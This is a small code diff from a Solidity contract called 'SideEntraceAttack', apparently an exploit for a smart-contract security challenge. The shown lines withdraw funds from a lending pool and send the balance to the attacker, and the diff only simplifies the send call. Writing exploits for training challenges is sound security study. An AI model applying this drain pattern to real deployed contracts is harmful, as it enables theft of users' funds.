@@ -39,7 +39,7 @@ contract SideEntraceAttack {
         console.log("Starting printer");
         pool.withdraw();
         console.log("BBRRRTTTT");
-        address(attacker).send(balance);
+        attacker.send(balance);
     }
 
 }
